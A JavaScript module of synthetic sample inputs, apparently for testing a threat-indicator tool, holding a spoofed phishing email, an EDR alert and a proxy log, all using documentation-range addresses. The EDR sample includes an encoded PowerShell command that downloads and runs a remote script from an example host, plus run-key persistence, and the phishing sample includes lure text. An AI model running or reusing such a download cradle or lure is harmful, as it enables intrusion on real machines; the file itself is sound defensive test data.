/* Synthetic sample inputs. Every address is from a documentation range (RFC 5737 / RFC 3849)
 * or a reserved example domain. Nothing here points at real infrastructure.            */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory();
  else root.SAMPLES = factory();
}(typeof self !== 'undefined' ? self : this, function () {
  return [
    {
      id: 'phish',
      label: 'Phishing email',
      note: 'Full headers + body: spoofed display name, SPF/DMARC fail, Reply-To mismatch',
      text: [
        'Received: from mail-gw.example.org (mail-gw.example.org [203.0.113.45])',
        '\tby mx.corp.example.com (Postfix) with ESMTPS id 4F2A91',
        '\tfor <victim@corp.example.com>; Tue, 10 Nov 2026 09:12:44 -0600',
        'Received: from [198.51.100.23] (helo=localhost) by mail-gw.example.org',
        '\twith esmtpa (Exim 4.96) id 1abcde-000123-AB; Tue, 10 Nov 2026 15:12:31 +0000',
        'Authentication-Results: mx.corp.example.com;',
        '\tspf=fail smtp.mailfrom=billing-notice.example.net;',
        '\tdkim=none; dmarc=fail header.from=accounts-payable.example.com',
        'Return-Path: <bounce@billing-notice.example.net>',
        'From: "Accounts Payable - support@example.com" <it-helpdesk@accounts-payable.example.com>',
        'Reply-To: <collect@free-mail.example.org>',
        'To: victim@corp.example.com',
        'Subject: Action required: invoice 88231 is overdue',
        'Date: Tue, 10 Nov 2026 15:12:30 +0000',
        'Message-ID: <20261110151230.7781@billing-notice.example.net>',
        '',
        'Hello,',
        '',
        'Invoice 88231 is overdue. Review and pay here to avoid suspension:',
        'hxxps://invoice-portal[.]example[.]net/login?id=88231',
        '',
        'The attached statement is also available at http://203.0.113.45:8080/statement.zip',
        'Questions? Write to collect[at]free-mail[.]example[.]org',
        '',
        'Attachment hash (SHA-256): 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'
      ].join('\n')
    },
    {
      id: 'edr',
      label: 'EDR alert',
      note: 'Process tree, encoded PowerShell, run-key persistence, hashes, CVE',
      text: [
        '[2026-11-10T14:03:11Z] ALERT  rule="Suspicious PowerShell child of WINWORD"  host=FIN-LT-0427  user=CORP\\jdoe  severity=high',
        'parent : C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
        'process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABvAGEAZAAtAGgAbwBzAHQALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=',
        'dropped: C:\\Users\\jdoe\\AppData\\Roaming\\Updater\\svc_update.exe',
        'sha256 : 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824',
        'md5    : 5d41402abc4b2a76b9719d911017c592',
        'persist: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcUpdate = "C:\\Users\\jdoe\\AppData\\Roaming\\Updater\\svc_update.exe"',
        'conn   : 10.20.30.41:51544 -> 198.51.100.77:443 (beacon every 60s)',
        'vuln   : document abused CVE-2017-11882 (Equation Editor)'
      ].join('\n')
    },
    {
      id: 'proxy',
      label: 'Proxy / firewall log',
      note: 'Mixed log lines with defanged indicators, internal and external IPs, IPv6',
      text: [
        '2026-11-10 08:14:02 10.1.4.77 GET hxxp://update-check[.]example[.]com/gate.php?id=7731 200 4121 "Mozilla/5.0"',
        '2026-11-10 08:14:09 10.1.4.77 CONNECT 192.0.2.99:4443 TUNNEL_ESTABLISHED',
        '2026-11-10 08:15:40 10.1.9.12 GET https://bit.ly/3xAmple 302 0',
        '2026-11-10 08:16:01 10.1.4.77 GET http://user:pass@198.51.100.5/panel/login.php 401 512',
        '2026-11-10 08:16:30 10.1.4.77 DNS query xn--80ak6aa92e.example.org A -> 203.0.113.200',
        '2026-11-10 08:17:12 fe80::1ff:fe23:4567:890a -> 2001:db8:85a3::8a2e:370:7334 tcp/443 ALLOW',
        'threat-intel hit: cdn-static.example.net also seen in 192.0.2.99 beacons',
        'contact for takedown: abuse@example.net'
      ].join('\n')
    }
  ];
}));
